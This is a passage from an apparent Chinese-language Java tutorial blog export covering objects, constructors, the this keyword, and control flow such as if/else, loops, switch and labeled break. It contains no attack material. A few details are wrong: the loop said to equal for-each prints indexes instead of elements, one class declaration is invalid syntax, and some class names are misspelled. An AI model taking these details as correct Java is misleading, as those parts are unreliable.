punctuation">;</span><span class="token class-name"><span class="token namespace">b<span class="token punctuation">.</span></span>Bee</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这是错误的写法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><strong>一个对象变量并没有实际包含一个对象，而仅仅引用一个对象：</strong></p></blockquote><pre><code>Bee bee = b;</code></pre><blockquote><p>此时变量 b 和变量 bee 引用的是同一个对象</p></blockquote><br>### 无参构造器很多类都包含一个无参构造器函数，**对象由无参构造器创建对象时，其状态会设置为默认值。**<h3 id="null-与-NullPointException："><a href="#null-与-NullPointException：" class="headerlink" title="null 与 NullPointException："></a>null 与 NullPointException：</h3><blockquote><p><strong>null</strong>:可以显示地将对象变量设置为 null，表明这个对象变量目前没有引用任何对象</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Bee</span> b<span class="token punctuation">;</span><span class="token comment">//声明一个 Bee 对象 b 但是没有进行初始化则默认为 null</span>b <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token comment">//显示将对象赋值为 null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><strong>NullPointException</strong>：运行错误，空指针异常，若调用值为 null 的对象<strong>的方法或者属性</strong>，则会报此异常。</p></blockquote><br>### 构造器与继承 ###- **构造器不能继承**- **Java 规定构造子类之前必须先构造父类，即 super(...):**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">super</span><span class="token punctuation">(</span>参数与父类对应<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## 自定义类**类的定义格式为：**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> 类名 <span class="token punctuation">{</span>    实例域 <span class="token number">1</span><span class="token comment">//实例域也叫成员变量</span>    实例域 <span class="token number">2</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">{</span>        初始化块<span class="token comment">//可以是静态的</span>    <span class="token punctuation">}</span>    <span class="token comment">//构造器 1</span>    <span class="token keyword">public</span> 类名<span class="token punctuation">(</span>参数 <span class="token number">1</span> 类型 参数 <span class="token number">1</span><span class="token punctuation">,</span> 参数 <span class="token number">2</span> 类型 参数 <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//参数数量大于等于 0 个</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token comment">//构造器 2</span>    <span class="token keyword">public</span> 类名<span class="token punctuation">(</span>参数 <span class="token number">1</span> 类型 参数 <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//多个构造器遵循重载规则。</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//各种构造器，只要遵循重载规则，随便你搞几个...</span>    方法 <span class="token function">1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    方法 <span class="token function">2</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">//各种方法</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>### 实例域：- 实例域即为对象中的数据，也叫成员变量或类的属性。- 实例域是定义在类里面，方法及构造器之外的变量。<br>### 局部变量：- 定义在构造器或方法内的变量（包括参数）为局部变量，局部变量在出了该语句块（{}为块）后则不能再访问该局部变量<p>注意：</p><blockquote><p><strong>不要在构造器中定义与实例域重名的局部变量。</strong>例如下面的构造器将无法设置 x 和 y 的值：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//类</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token comment">//实例域（成员变量）</span>    <span class="token keyword">int</span> y<span class="token punctuation">;</span><span class="token comment">//实例域（成员变量）</span>    <span class="token keyword">public</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//构造器</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token comment">//不会报错，但是这个 x 是局部变量，不是上面的成员变量 x</span>        <span class="token keyword">int</span> y <span class="token operator">=</span> b<span class="token punctuation">;</span><span class="token comment">//不会报错，但是这个 y 是局部变量，不是上面的成员变量 y</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Java 中有一个就近原则：<strong>相同变量名的不同变量，哪个的声明近，这个变量就是谁</strong>。<br>再解释仔细一点就是：构造器或方法中的变量名（局部变量）若与成员变量名相同，则该构造器或方法中的这个变量不是成员变量。<br>但是可以通过 <strong>this</strong> 关键字来调用当前类的成员变量。</p></blockquote><br>## 隐式参数与显示参数方法用于操作对象以及存取它们的实例域。例如 Bee 类的方法 setLocation()：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLocation</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//设置坐标</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个 Bee 类型的对象 b 调用该方法,其坐标会被设置为新的值：<br>    <strong>b</strong>.setLocation(<strong>1</strong>,<strong>2</strong>);<br>它的结果是将 b 的 x 和 y 值设置为了 1 和 2.<br><strong>而这个 setLocation 方法实际上是有三个参数：一个隐式参数和两个显式参数</strong></p><ol><li>b：<strong>隐式参数（implicit）</strong>是出现在方法名之前的 Bee 类对象。</li><li>x 和 y：<strong>显式参数（explicit）</strong>是位于方法名后面的括号内的各种类型的值。</li></ol><p><strong>除此之外，在每一个方法中，关键字 this 也表示隐式参数：</strong></p><ul><li><strong>this</strong> 指的是当前类，在哪个类中使用 this，则 <strong>this</strong> 就是哪个类。</li><li>访问成员变量或方法及构造器的时候默认使用 <strong>this</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象 </tag>
            
            <tag> 参数 </tag>
            
            <tag> 类 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 构造器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流程控制</title>
      <link href="/2017/02/23/liu-cheng-kong-zhi/"/>
      <url>/2017/02/23/liu-cheng-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="块作用域"><a href="#块作用域" class="headerlink" title="块作用域"></a>块作用域</h2><p>学习流程控制之前，先来了解以下<strong>块作用域</strong>：<strong>块</strong>（即符合语句）是指由一对花括号括起来的若干条简单的 Java 语句。<em>块</em>确定了变量的作用域。一个<em>块</em>可以嵌套在另一个<em>块</em>中。但是不能再嵌套的两个块中声明同名的变量：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> k<span class="token punctuation">;</span>        <span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token comment">//错误，前面已经声明过变量 n 了</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><p><strong>条件语句的格式为：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> 执行语句<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若要在某个条件为真时执行多条语句，则格式为：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>    执行语句 <span class="token number">1</span>    执行语句 <span class="token number">2</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以在条件未达成时执行另一段语句：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> 执行语句 <span class="token number">1</span> <span class="token keyword">else</span> 执行语句 <span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>else 部分是可选的，else 子句与最邻近的 if 构成一组,如下面代码中，else 与第二个 if 配对：</p></blockquote><blockquote><p>   if (x &lt;= 0) <strong>if</strong> (x == 0) sign = 0; <strong>else</strong> sign = -1;</p></blockquote><blockquote><p>当然，建议在写代码时即使执行条件只有一句，为了使代码更加清晰易懂，也建议加上花括号：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        sign <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        sign <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以重复地交替出现 if … else if … ：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>条件 <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>条件 <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>条件 <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## 循环语句### while 循环**当条件为 true 时，while 循环执行一条语句(也可以是一个语句块)：**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> 执行语句<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span> <span class="token punctuation">{</span>    执行语句 <span class="token number">1</span>    执行语句 <span class="token number">2</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>需要循环的执行语句叫循环体。<br>while 循环语句首先检测循环条件，如果开始时，循环条件的值就为 false，则 while 循环体一次也不执行。</p><p>因此，循环体中的代码有可能不被执行。如果希望循环体至少执行一次，则需要使用 do/while 循环语句。</p></blockquote><br>### do/while 循环 ##语法格式：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">do</span> 执行语句 <span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">do</span> <span class="token punctuation">{</span>    循环体<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>do/while 循环语句限制性语句(通常是一个语句块)，再检测循环条件；然后重复语句。</p><p>记得<strong>结尾加分号“;”</strong></p></blockquote><br>### for 循环**for 循环又叫确定循环，for 循环语句是支持迭代的一种通用结构，利用每次迭代之后更新的计数器或类似的变量来控制迭代次数：**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>初始化计数器<span class="token punctuation">;</span> 计数器循环条件<span class="token punctuation">;</span> 更新计数器<span class="token punctuation">)</span> <span class="token punctuation">{</span>    循环体<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>for 的第一部分通常用于对计数器初始化；<br>第二部分给出每次新一轮循环执行前的条件(当然应该与计数器有关)；<br>第三部分指示如何更新计数器。三部分用“;”隔开，例如：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//之后将无法使用 i</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该代码初始化一个计数器 i 的值为 1，循环判断 i 是否小于等于 10，只要 i 小于等于 10，就输出一次 i 的值，并且更新计数器 i 使其自增 1，直到 i 的值不再小于等于 10 的时候，循环结束。</p></blockquote><p>for 循环的四个部分执行顺序如图：<br><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fd50u92rn7j21282bch44.jpg" alt="for 循环流程图"></p><ol><li><strong>初始化计数器</strong></li><li><strong>判断循环条件</strong></li><li><strong>循环体</strong></li><li><strong>更新计数器</strong></li><li>回到第二步开始循环</li></ol><p>在 for 循环第一部分声明的变量，其作用域为整个循环体，在循环体外无法使用该变量，若要在 for 循环体之外使用循环计数器，则需要在循环语句的前面且在外部声明：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//这之后可以继续使用 i</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>for 循环只是 while 循环的一种简化形式,如上述代码也可写成：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>警告：</strong><br><strong>在循环中,检测两个浮点数是否相等时需要格外小心！如下面的 for 循环：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> x <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> x <span class="token operator">+=</span> <span class="token number">0.1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>该循环永远不会结束。由于舍入的误差，无法得到精确值。该循环中，因为 0.1 无法精确地用二进制表示，所以，x 将从 9.999 999 999 999 98 跳到 10.099 999 999 999 98。</strong></p><br>### for each 循环**「for each 循环」又称「增强 for 循环」，可用来依次处理数组中的每个元素(其他类型的元素集合亦可)而不必为指定下标值而分心**，该循环的格式为：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>声明变量 <span class="token operator">:</span> 变量所属集合<span class="token punctuation">)</span> 执行语句<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>声明变量 <span class="token operator">:</span> 变量所属集合<span class="token punctuation">)</span> <span class="token punctuation">{</span>    循环体<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>该循环声明一个变量用于暂存集合中的每一个元素，并执行相应语句(或语句块)，变量所属<a href="/2017/03/17/%E9%9B%86%E5%90%88/">集合</a>必须是一个数组或是一个实现了 Iterable 接口的类对象(例如 ArrayList)，代码示例：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> a<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>打印数组 a 中的每一个元素，一个元素占一行，这种循环应读作“循环 a 中的每一个元素”。</p><p>该代码等同于：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>for each 循环语句的循环变量将会遍历数组中的每个元素，而不需要使用下标值。</strong></p><p><strong>因此，如果不希望遍历集合中的每个元素或者在循环内部需要使用下标值时还是要使用传统的 for 循环。</strong></p></blockquote><br>## 多重选择：switch 语句在处理多个选项时，使用 if/else 结构会显得很笨拙，这时使用 switch 语句则会方便很多：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">switch</span> <span class="token punctuation">(</span>选项值<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> 情况 <span class="token number">1</span><span class="token operator">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> 情况 <span class="token number">2</span><span class="token operator">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> 情况 <span class="token number">3</span><span class="token operator">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>switch 语句将从与选项值相匹配的 case 标签处开始执行直到遇到 break 语句，或者执行到 switch 语句的结束处为止。如果没有相匹配的 case 标签，则会执行 default 子句，若也没有 default 子句，则直接结束 switch 语句。</strong></p><blockquote><p>有可能触发多个 case 分支。如果在 case 分支语句的末尾没有 break 语句，那么就会接着执行下一个 case 分支语句。这种情况相当危险，常常会因此引发错误，所以不推荐使用 switch 语句。</p><p>如果你确实想用这种“直通式”行为，可以为其外围方法加一个标注 @SuppressWarnings(“fallthrough”)。这样就不会对这个方法生成警告了。</p></blockquote><p><strong>case 标签可以是：</strong></p><ul><li>类型为 char、byte、short 或 int (或者它们的包装器类： Character、Byte、Short 和 Inter)的常量表达式。</li><li>枚举常量</li><li>JDK 7 及 以上 JDK 版本中的 case 标签还可以是字符串字面量。</li></ul><br>## 中断控制流程语句### 不带标签的 break 语句与用于退出 switch 语句的 break 语句一样，也可以**用于退出循环语句**：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>years <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    balance <span class="token operator">+=</span> payment<span class="token punctuation">;</span>    <span class="token keyword">double</span> interest <span class="token operator">=</span> balance <span class="token operator">*</span> interestRate <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>    balance <span class="token operator">+=</span> interest<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>balance <span class="token operator">&gt;=</span> goal<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    years <span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该代码在循环开始时，如果 years &gt; 100，或者在循环体中 balance &gt;= goal，则结束循环语句。<br>上面的代码也可以在不使用 break 的情况下计算 years 的值：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>years <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token operator">&amp;&amp;</span> balance <span class="token operator">&lt;</span> goal<span class="token punctuation">)</span> <span class="token punctuation">{</span>    balance <span class="token operator">+=</span> payment<span class="token punctuation">;</span>    <span class="token keyword">double</span> interest <span class="token operator">=</span> balance <span class="token operator">*</span> interestRate <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>    balance <span class="token operator">+=</span> interest<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>balance <span class="token operator">&lt;</span> goal<span class="token punctuation">)</span> <span class="token punctuation">{</span>        years <span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>但是，这样写会检测两次 balance &lt; goal，为了避免重复检测，可以使用 break 语句</p></blockquote><br>### 带标签的 break 语句**带标签的 break 语句用于跳出多重嵌套的循环语句：**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Scanner</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>read_data<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>注意：标签必须放在希望跳出的最外层循环之前，并且必须紧跟一个冒号！<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"输入一个数字 &gt;= 0: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">break</span> read_data<span class="token punctuation">;</span><span class="token comment">//跳出(结束) while 循环语句</span>        <span class="token punctuation">}</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//这里将在 break 后立即执行</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    解决你不想发生的情况<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    正常执行的代码<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以将标签应用到任何语句中，甚至可以应用到 if 语句或者块语句中：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">label<span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span 